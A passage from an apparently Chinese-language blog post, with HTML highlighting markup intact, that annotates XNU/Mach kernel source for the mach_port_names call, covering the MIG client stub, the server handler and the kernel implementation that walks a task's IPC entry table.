<span class="keyword">mach_msg_body_t</span> msgh_body;</div><div class="line">        <span class="keyword">mach_msg_ool_descriptor_t</span> names;</div><div class="line">        <span class="keyword">mach_msg_ool_descriptor_t</span> types;</div><div class="line">        <span class="comment">/* end of the kernel processed data */</span></div><div class="line">        NDR_record_t NDR;</div><div class="line">        <span class="keyword">mach_msg_type_number_t</span> namesCnt;</div><div class="line">        <span class="keyword">mach_msg_type_number_t</span> typesCnt;</div><div class="line">        <span class="keyword">mach_msg_trailer_t</span> trailer;</div><div class="line">    &#125; Reply __attribute__((unused));</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(4)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">        <span class="keyword">mach_msg_header_t</span> Head;</div><div class="line">        <span class="comment">/* start of the kernel processed data */</span></div><div class="line">        <span class="keyword">mach_msg_body_t</span> msgh_body;</div><div class="line">        <span class="keyword">mach_msg_ool_descriptor_t</span> names;</div><div class="line">        <span class="keyword">mach_msg_ool_descriptor_t</span> types;</div><div class="line">        <span class="comment">/* end of the kernel processed data */</span></div><div class="line">        NDR_record_t NDR;</div><div class="line">        <span class="keyword">mach_msg_type_number_t</span> namesCnt;</div><div class="line">        <span class="keyword">mach_msg_type_number_t</span> typesCnt;</div><div class="line">    &#125; __Reply __attribute__((unused));</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="comment">/*</span></div><div class="line">     * typedef struct &#123;</div><div class="line">     *  mach_msg_header_t Head;</div><div class="line">     *  NDR_record_t NDR;</div><div class="line">     *  kern_return_t RetCode;</div><div class="line">     * &#125; mig_reply_error_t;</div><div class="line">     */</div><div class="line"></div><div class="line">    <span class="keyword">union</span> &#123;</div><div class="line">        Request In;</div><div class="line">        Reply Out;</div><div class="line">    &#125; Mess;</div><div class="line"></div><div class="line">    Request *InP = &amp;Mess.In;</div><div class="line">    Reply *Out0P = &amp;Mess.Out;</div><div class="line"></div><div class="line">    <span class="keyword">mach_msg_return_t</span> msg_result;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MIG_check__Reply__mach_port_names_t__defined</span></div><div class="line">    <span class="keyword">kern_return_t</span> check_result;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MIG_check__Reply__mach_port_names_t__defined */</span></span></div><div class="line"></div><div class="line">    __DeclareSendRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)  <span class="comment">//[将mach_port_names函数 绑定到对应的编号 ]</span></div><div class="line"></div><div class="line">    <span class="comment">// 准备消息头</span></div><div class="line">    InP-&gt;Head.msgh_bits =</div><div class="line">        MACH_MSGH_BITS(<span class="number">19</span>, MACH_MSG_TYPE_MAKE_SEND_ONCE);</div><div class="line">    <span class="comment">/* msgh_size passed as argument */</span></div><div class="line">    InP-&gt;Head.msgh_request_port = task;</div><div class="line">    InP-&gt;Head.msgh_reply_port = mig_get_reply_port();</div><div class="line">    InP-&gt;Head.msgh_id = <span class="number">3200</span>;</div><div class="line">    InP-&gt;Head.msgh_reserved = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">/* BEGIN VOUCHER CODE */</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USING_VOUCHERS</span></div><div class="line">    <span class="keyword">if</span> (voucher_mach_msg_set != <span class="literal">NULL</span>) &#123;</div><div class="line">        voucher_mach_msg_set(&amp;InP-&gt;Head);</div><div class="line">    &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// USING_VOUCHERS</span></span></div><div class="line"></div><div class="line"><span class="comment">/* END VOUCHER CODE */</span></div><div class="line"></div><div class="line">    __BeforeSendRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">// 由 MIG 生成的 调用 mach_msg</span></div><div class="line">    msg_result = mach_msg(&amp;InP-&gt;Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(Request), (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(Reply), InP-&gt;Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</div><div class="line"></div><div class="line"></div><div class="line">    __AfterSendRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)</div><div class="line">    <span class="keyword">if</span> (msg_result != MACH_MSG_SUCCESS) &#123;</div><div class="line">        __MachMsgErrorWithoutTimeout(msg_result);</div><div class="line">        &#123; <span class="keyword">return</span> msg_result; &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__MIG_check__Reply__mach_port_names_t__defined)</span></div><div class="line">    check_result = __MIG_check__Reply__mach_port_names_t((__Reply__mach_port_names_t *)Out0P);</div><div class="line">    <span class="keyword">if</span> (check_result != MACH_MSG_SUCCESS)</div><div class="line">        &#123; <span class="keyword">return</span> check_result; &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* defined(__MIG_check__Reply__mach_port_names_t__defined) */</span></span></div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">// 返回 数据到 userspace</span></div><div class="line">    *names = (<span class="keyword">mach_port_name_array_t</span>)(Out0P-&gt;names.address);</div><div class="line">    *namesCnt = Out0P-&gt;namesCnt;</div><div class="line"></div><div class="line">    *types = (<span class="keyword">mach_port_type_array_t</span>)(Out0P-&gt;types.address);</div><div class="line">    *typesCnt = Out0P-&gt;typesCnt;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> KERN_SUCCESS;</div><div class="line">&#125;</div><div class="line"></div><div class="line">mach_portServer.c  #########################</div><div class="line"></div><div class="line"><span class="comment">// 检查用户传入的参数，直接返回结果</span></div><div class="line">mig_internal <span class="keyword">kern_return_t</span> __MIG_check__Request__mach_port_names_t(__attribute__((__unused__)) __Request__mach_port_names_t *In0P)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">typedef</span> __Request__mach_port_names_t __Request;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __MigTypeCheck</span></div><div class="line">    <span class="keyword">if</span> ((In0P-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX) ||</div><div class="line">        (In0P-&gt;Head.msgh_size != (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(__Request)))</div><div class="line">        <span class="keyword">return</span> MIG_BAD_ARGUMENTS;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MigTypeCheck */</span></span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> MACH_MSG_SUCCESS;</div><div class="line">&#125;</div><div class="line"></div><div class="line">mig_internal novalue _Xmach_port_names</div><div class="line">    (<span class="keyword">mach_msg_header_t</span> *InHeadP, <span class="keyword">mach_msg_header_t</span> *OutHeadP)</div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(4)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">        <span class="keyword">mach_msg_header_t</span> Head;</div><div class="line">        <span class="keyword">mach_msg_trailer_t</span> trailer;</div><div class="line">    &#125; Request __attribute__((unused));</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">typedef</span> __Request__mach_port_names_t __Request;</div><div class="line">    <span class="keyword">typedef</span> __Reply__mach_port_names_t Reply __attribute__((unused));</div><div class="line"></div><div class="line">    <span class="comment">/*</span></div><div class="line">     * typedef struct &#123;</div><div class="line">     *  mach_msg_header_t Head;</div><div class="line">     *  NDR_record_t NDR;</div><div class="line">     *  kern_return_t RetCode;</div><div class="line">     * &#125; mig_reply_error_t;</div><div class="line">     */</div><div class="line"></div><div class="line">    Request *In0P = (Request *) InHeadP;</div><div class="line">    Reply *OutP = (Reply *) OutHeadP;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MIG_check__Request__mach_port_names_t__defined</span></div><div class="line">    <span class="keyword">kern_return_t</span> check_result;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MIG_check__Request__mach_port_names_t__defined */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> UseStaticTemplates</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">mach_msg_ool_descriptor_t</span> namesTemplate = &#123;</div><div class="line">        <span class="comment">/* addr = */</span>        (<span class="keyword">void</span> *)<span class="number">0</span>,</div><div class="line">        <span class="comment">/* size = */</span>        <span class="number">0</span>,</div><div class="line">        <span class="comment">/* deal = */</span>        FALSE,</div><div class="line">        <span class="comment">/* copy = */</span>        MACH_MSG_VIRTUAL_COPY,</div><div class="line">        <span class="comment">/* pad2 = */</span>        <span class="number">0</span>,</div><div class="line">        <span class="comment">/* type = */</span>        MACH_MSG_OOL_DESCRIPTOR,</div><div class="line">    &#125;;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> UseStaticTemplates</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">mach_msg_ool_descriptor_t</span> typesTemplate = &#123;</div><div class="line">        <span class="comment">/* addr = */</span>        (<span class="keyword">void</span> *)<span class="number">0</span>,</div><div class="line">        <span class="comment">/* size = */</span>        <span class="number">0</span>,</div><div class="line">        <span class="comment">/* deal = */</span>        FALSE,</div><div class="line">        <span class="comment">/* copy = */</span>        MACH_MSG_VIRTUAL_COPY,</div><div class="line">        <span class="comment">/* pad2 = */</span>        <span class="number">0</span>,</div><div class="line">        <span class="comment">/* type = */</span>        MACH_MSG_OOL_DESCRIPTOR,</div><div class="line">    &#125;;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line"></div><div class="line">    <span class="keyword">kern_return_t</span> RetCode;</div><div class="line">    __DeclareRcvRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)</div><div class="line">    __BeforeRcvRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)</div><div class="line"></div><div class="line"><span class="comment">// 检查用户参数</span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__MIG_check__Request__mach_port_names_t__defined)</span></div><div class="line">    check_result = __MIG_check__Request__mach_port_names_t((__Request *)In0P);</div><div class="line">    <span class="keyword">if</span> (check_result != MACH_MSG_SUCCESS)</div><div class="line">        &#123; MIG_RETURN_ERROR(OutP, check_result); &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* defined(__MIG_check__Request__mach_port_names_t__defined) */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> UseStaticTemplates</span></div><div class="line">    OutP-&gt;names = namesTemplate;</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span>   <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line">    OutP-&gt;names.deallocate =  FALSE;</div><div class="line">    OutP-&gt;names.copy = MACH_MSG_VIRTUAL_COPY;</div><div class="line">    OutP-&gt;names.pad1 = <span class="number">0</span>;</div><div class="line">    OutP-&gt;names.type = MACH_MSG_OOL_DESCRIPTOR;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(KERNEL) &amp;&amp; !defined(__LP64__)</span></div><div class="line">    OutP-&gt;names.pad_end = <span class="number">0</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> UseStaticTemplates</span></div><div class="line">    OutP-&gt;types = typesTemplate;</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span>   <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line">    OutP-&gt;types.deallocate =  FALSE;</div><div class="line">    OutP-&gt;types.copy = MACH_MSG_VIRTUAL_COPY;</div><div class="line">    OutP-&gt;types.pad1 = <span class="number">0</span>;</div><div class="line">    OutP-&gt;types.type = MACH_MSG_OOL_DESCRIPTOR;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(KERNEL) &amp;&amp; !defined(__LP64__)</span></div><div class="line">    OutP-&gt;types.pad_end = <span class="number">0</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line"></div><div class="line"></div><div class="line">    OutP-&gt;namesCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">    OutP-&gt;typesCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">// 核心，  调用 mach_port.c 中的 mach_port_names 函数</span></div><div class="line">    RetCode = mach_port_names(In0P-&gt;Head.msgh_request_port, (<span class="keyword">mach_port_name_array_t</span> *)&amp;(OutP-&gt;names.address), &amp;OutP-&gt;namesCnt, (<span class="keyword">mach_port_type_array_t</span> *)&amp;(OutP-&gt;types.address), &amp;OutP-&gt;typesCnt);</div><div class="line">    <span class="keyword">if</span> (RetCode != KERN_SUCCESS) &#123;</div><div class="line">        MIG_RETURN_ERROR(OutP, RetCode);</div><div class="line">    &#125;</div><div class="line">    OutP-&gt;names.size = OutP-&gt;namesCnt * <span class="number">4</span>;</div><div class="line"></div><div class="line">    OutP-&gt;types.size = OutP-&gt;typesCnt * <span class="number">4</span>;</div><div class="line"></div><div class="line"></div><div class="line">    OutP-&gt;NDR = NDR_record;</div><div class="line"></div><div class="line"></div><div class="line">    OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX;</div><div class="line">    OutP-&gt;Head.msgh_size = (<span class="keyword">mach_msg_size_t</span>)(<span class="keyword">sizeof</span>(Reply));</div><div class="line">    OutP-&gt;msgh_body.msgh_descriptor_count = <span class="number">2</span>;</div><div class="line">    __AfterRcvRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>现在看下 osfmk/mach/mach_port.c 中mach_port_names 的实现。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span></div><div class="line">mach_port_names(</div><div class="line">    <span class="keyword">ipc_space_t</span>     space,</div><div class="line">    <span class="keyword">mach_port_name_t</span>    **namesp,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span>  *namesCnt,</div><div class="line">    <span class="keyword">mach_port_type_t</span>    **typesp,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span>  *typesCnt)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">ipc_entry_t</span> table;</div><div class="line">    <span class="keyword">ipc_entry_num_t</span> tsize;</div><div class="line">    <span class="keyword">mach_port_index_t</span> index;</div><div class="line">    <span class="keyword">ipc_entry_num_t</span> actual; <span class="comment">/* this many names */</span></div><div class="line">    <span class="keyword">ipc_port_timestamp_t</span> timestamp; <span class="comment">/* logical time of this operation */</span></div><div class="line">    <span class="keyword">mach_port_name_t</span> *names;</div><div class="line">    <span class="keyword">mach_port_type_t</span> *types;</div><div class="line">    <span class="keyword">kern_return_t</span> kr;</div><div class="line"></div><div class="line">    <span class="keyword">vm_size_t</span> size;     <span class="comment">/* size of allocated memory */</span></div><div class="line">    <span class="keyword">vm_offset_t</span> addr1;  <span class="comment">/* allocated memory, for names */</span></div><div class="line">    <span class="keyword">vm_offset_t</span> addr2;  <span class="comment">/* allocated memory, for types */</span></div><div class="line">    <span class="keyword">vm_map_copy_t</span> memory1;  <span class="comment">/* copied-in memory, for names */</span></div><div class="line">    <span class="keyword">vm_map_copy_t</span> memory2;  <span class="comment">/* copied-in memory, for types */</span></div><div class="line"></div><div class="line">    <span class="comment">/* safe simplifying assumption */</span></div><div class="line">    <span class="keyword">static_assert</span>(<span class="keyword">sizeof</span>(<span class="keyword">mach_port_name_t</span>) == <span class="keyword">sizeof</span>(<span class="keyword">mach_port_type_t</span>));</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (space == IS_NULL)</div><div class="line">        <span class="keyword">return</span> KERN_INVALID_TASK;</div><div class="line"></div><div class="line">    size = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (;;) &#123;</div><div class="line">        <span class="keyword">ipc_entry_num_t</span> bound;</div><div class="line">        <span class="keyword">vm_size_t</span> size_needed;</div><div class="line"></div><div class="line">        is_read_lock(space);</div><div class="line">        <span class="keyword">if</span> (!is_active(space)) &#123;</div><div class="line">            is_read_unlock(space);</div><div class="line">            <span class="keyword">if</span> (size != <span class="number">0</span>) &#123;</div><div class="line">                kmem_free(ipc_kernel_map, addr1, size);</div><div class="line">                kmem_free(ipc_kernel_map, addr2, size);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> KERN_INVALID_TASK;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">/* upper bound on number of names in the space */</span></div><div class="line">        bound = space-&gt;is_table_size;</div><div class="line">        size_needed = vm_map_round_page(</div><div class="line">            (bound * <span class="keyword">sizeof</span>(<span class="keyword">mach_port_name_t</span>)),</div><div class="line">            VM_MAP_PAGE_MASK(ipc_kernel_map));</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (size_needed &lt;= size)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (size != <span class="number">0</span>) &#123;</div><div class="line">            kmem_free(ipc_kernel_map, addr1, size);</div><div class="line">            kmem_free(ipc_kernel_map, addr2, size);</div><div class="line">        &#125;</div><div class="line">        size = size_needed;</div><div class="line"></div><div class="line">        kr = vm_allocate(ipc_kernel_map, &amp;addr1, size, VM_FLAGS_ANYWHERE | VM_MAKE_TAG(VM_KERN_MEMORY_IPC));</div><div class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS)</div><div class="line">            <span class="keyword">return</span> KERN_RESOURCE_SHORTAGE;</div><div class="line"></div><div class="line">        kr = vm_allocate(ipc_kernel_map, &amp;addr2, size, VM_FLAGS_ANYWHERE | VM_MAKE_TAG(VM_KERN_MEMORY_IPC));</div><div class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</div><div class="line">            kmem_free(ipc_kernel_map, addr1, size);</div><div class="line">            <span class="keyword">return</span> KERN_RESOURCE_SHORTAGE;</div><div class="line">        &#125;</div><div class="line"></div><div class="line"></div><div class="line">        kr = vm_map_wire(</div><div class="line">            ipc_kernel_map,</div><div class="line">            vm_map_trunc_page(addr1,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            vm_map_round_page(addr1 + size,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            VM_PROT_READ|VM_PROT_WRITE|VM_PROT_MEMORY_TAG_MAKE(VM_KERN_MEMORY_IPC),</div><div class="line">            FALSE);</div><div class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</div><div class="line">            kmem_free(ipc_kernel_map, addr1, size);</div><div class="line">            kmem_free(ipc_kernel_map, addr2, size);</div><div class="line">            <span class="keyword">return</span> KERN_RESOURCE_SHORTAGE;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* space is read-locked and active */</span></div><div class="line"></div><div class="line">    names = (<span class="keyword">mach_port_name_t</span> *) addr1;</div><div class="line">    types = (<span class="keyword">mach_port_type_t</span> *) addr2;</div><div class="line">    actual = <span class="number">0</span>;</div><div class="line"></div><div class="line">    timestamp = ipc_port_timestamp();</div><div class="line"></div><div class="line">    table = space-&gt;is_table;</div><div class="line">    tsize = space-&gt;is_table_size;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// 这里 从target task 的 ipc_space 中取出 space-&gt;is_table 中所有 entry.</span></div><div class="line"><span class="comment">// 根据 entry-&gt;ie_bits 可知该 entry 是否分配给了 port。</span></div><div class="line">    <span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; tsize; index++) &#123;</div><div class="line">        <span class="keyword">ipc_entry_t</span> entry = &amp;table[index];</div><div class="line">        <span class="keyword">ipc_entry_bits_t</span> bits = entry-&gt;ie_bits;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (IE_BITS_TYPE(bits) != MACH_PORT_TYPE_NONE) &#123;</div><div class="line">            <span class="keyword">mach_port_name_t</span> name;</div><div class="line"></div><div class="line">            name = MACH_PORT_MAKE(index, IE_BITS_GEN(bits));</div><div class="line"></div><div class="line">            <span class="comment">// 将 name和对应的 type（entry-&gt;ie_bits） 存储到数组 names 和 types中， actual 是数组的长度。</span></div><div class="line">            mach_port_names_helper(timestamp, entry, name, names,</div><div class="line">                           types, &amp;actual);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    is_read_unlock(space);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (actual == <span class="number">0</span>) &#123;</div><div class="line">        memory1 = VM_MAP_COPY_NULL;</div><div class="line">        memory2 = VM_MAP_COPY_NULL;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (size != <span class="number">0</span>) &#123;</div><div class="line">            kmem_free(ipc_kernel_map, addr1, size);</div><div class="line">            kmem_free(ipc_kernel_map, addr2, size);</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">vm_size_t</span> size_used;</div><div class="line">        <span class="keyword">vm_size_t</span> vm_size_used;</div><div class="line"></div><div class="line">        size_used = actual * <span class="keyword">sizeof</span>(<span class="keyword">mach_port_name_t</span>);</div><div class="line">        vm_size_used =</div><div class="line">            vm_map_round_page(size_used,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map));</div><div class="line"></div><div class="line"></div><div class="line">        kr = vm_map_unwire(</div><div class="line">            ipc_kernel_map,</div><div class="line">            vm_map_trunc_page(addr1,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            vm_map_round_page(addr1 + vm_size_used,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            FALSE);</div><div class="line">        assert(kr == KERN_SUCCESS);</div><div class="line"></div><div class="line"><span class="comment">// 释放addr1, addr2没有的空间</span></div><div class="line">        kr = vm_map_unwire(</div><div class="line">            ipc_kernel_map,</div><div class="line">            vm_map_trunc_page(addr2,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            vm_map_round_page(addr2 + vm_size_used,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            FALSE);</div><div class="line">        assert(kr == KERN_SUCCESS);</div><div class="line"></div><div class="line"><span class="comment">//将 addr1 中的 ports 拷贝到 memory1</span></div><div class="line">        kr = vm_map_copyin(ipc_kernel_map, (<span class="keyword">vm_map_address_t</span>)addr1,</div><div class="line">                   (<span class="keyword">vm_map_size_t</span>)size_used, TRUE, &amp;memory1);</div><div class="line">        assert(kr == KERN_SUCCESS);</div><div class="line"></div><div class="line">        kr = vm_map_copyin(ipc_kernel_map, (<span class="keyword">vm_map_address_t</span>)addr2,</div><div class="line">                   (<span class="keyword">vm_map_size_t</span>)size_used, TRUE, &amp;memory2);</div><div class="line">        assert(kr == KERN_SUCCESS);</div><div class="line"></div><div class="line">        ....</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    *namesp = (<span class="keyword">mach_port_name_t</span> *) memory1;</div><div class="line">    *namesCnt = actual;</div><div class="line">    *typesp = (<span class="keyword">mach_port_type_t</span> *) memory2;</div><div class="line">   